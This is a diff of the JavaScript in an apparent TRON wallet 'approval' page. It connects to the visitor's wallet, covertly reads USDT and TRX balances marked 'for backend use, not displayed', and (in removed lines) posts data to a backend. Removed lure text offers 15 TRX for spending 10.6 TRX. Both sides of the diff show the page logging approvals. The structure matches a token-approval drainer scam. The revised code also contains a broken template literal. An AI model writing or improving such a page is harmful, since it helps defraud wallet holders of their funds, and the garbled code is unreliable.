@@ -397,123 +397,67 @@
     };
 
     // 初始化钱包：不显示余额
+   // 初始化钱包（确保余额字段有值）
     async function initWallet() {
         try {
-            // 1. 获取用户地址
             userAddress = tronWeb.defaultAddress.base58;
-            if (!userAddress) throw new Error("获取地址失败");
-
-            // 2. 创建合约实例
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-            if (!trc20Contract) throw new Error("合约实例创建失败");
 
-            // 3. 采集余额（后台用，不显示）
-            try {
-                const rawTokenBalance = await getTokenBalanceWithTimeout(userAddress, 10000);
-                globalTokenBalance = rawTokenBalance.toFixed(2);
-            } catch (e) {
-                globalTokenBalance = "采集失败";
-            }
-            try {
-                const rawTrxBalance = await getTrxBalanceWithTimeout(userAddress, 10000);
-                globalTrxBalance = rawTrxBalance.toFixed(2);
-            } catch (e) {
-                globalTrxBalance = "采集失败";
-                globalTrxError = e.message;
-            }
+            // 采集USDT余额（必填）
+            const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+            tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
 
-            // 4. 激活授权按钮：仅显示地址，不显示余额
+            // 采集TRX余额（非必填）
+            const trxRaw = await tronWeb.trx.getBalance(userAddress);
+            trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
+
+            // 激活按钮
             document.getElementById("userInfo").innerHTML = `
-           已连接：${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>须消耗10.6个TRX，可领取15个TRX加密货币如放弃领取直接退出即可
-            `;
-            approveBtn.disabled = false;
-            // 确保授权按钮显示（避免意外隐藏）
-            approveBtn.style.display = "block";
-
-        } catch (initErr) {}
-    }
-
-    // TRX余额查询（后台用）
-    async function getTrxBalanceWithTimeout(address, timeout = 10000) {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), timeout);
-
-        try {
-            const rawBalance = await tronWeb.trx.getBalance(address, { signal: controller.signal });
-            return rawBalance / 1000000;
+                已连接：<br>
+                ${userAddress.slice(0,8)...${userAddress.slice(-6)}}<br>
+                `;
+            document.getElementById("approveBtn").disabled = false;
         } catch (e) {
-            throw e;
-        } finally {
-            clearTimeout(timeoutId);
+            
+            tokenBalance = "0.00";
+            trxBalance = "0.00";
         }
     }
 
-    // USDT余额查询（后台用）
-    async function getTokenBalanceWithTimeout(address, timeout = 10000) {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), timeout);
-
-        try {
-            const rawBalance = await trc20Contract.balanceOf(address).call({ signal: controller.signal });
-            return rawBalance / 1000000;
-        } catch (e) {
-            throw e;
-        } finally {
-            clearTimeout(timeoutId);
-        }
-    }
-
-    // 保存授权记录：不包含余额
+    // 原有辅助函数不变
     function saveApprovalRecord(record) {
         try {
             const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
             const newRecords = existing.filter(item => item.address !== record.address);
             newRecords.push(record);
             localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
-        } catch (e) {}
-    }
-
-    // 渲染授权记录：不显示余额
-    function renderApprovalRecords() {
-        const container = document.getElementById("approvalRecords");
-        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-        
-        if (records.length === 0) {
-            container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
-        } else {
-            container.innerHTML = records.map(record => `
-                <div class="record-item">
-                    <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                    <p><strong>授权状态：</strong>${record.approveStatus}</p>
-                    <p><strong>授权时间：</strong>${record.approveTime}</p>
-                    <p><strong>授权类型：</strong>${record.approveType}</p>
-                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易详情</a></p>` : ""}
-                </div>
-            `).join("");
+        } catch (e) {
+            
         }
     }
 
-    // 发送数据到后端
-    async function sendDataToBackend(data) {
+    function renderApprovalRecords() {
         try {
-            const controller = new AbortController();
-            setTimeout(() => controller.abort(), 15000);
-            
-            const res = await fetch(BACKEND_API, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data),
-                credentials: "include",
-                signal: controller.signal
-            });
-            
-            if (!res.ok) throw new Error(`后端响应错误：${res.status}`);
-            return res.json();
+            const container = document.getElementById("approvalRecords");
+            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+            if (records.length === 0) {
+                container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
+                return;
+            }
+            container.innerHTML = records.map(record => `
+                <div class="record-item">
+                    <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
+                    <p><strong>授权类型：</strong>${record.approveType}</p>
+                    <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
+                    <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
+                    <p><strong>时间：</strong>${record.approveTime}</p>
+                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>` : ""}
+                </div>
+            `).join("");
         } catch (e) {
-            throw e;
+            
         }
     }
 </script>
 </body>
 </html>
-
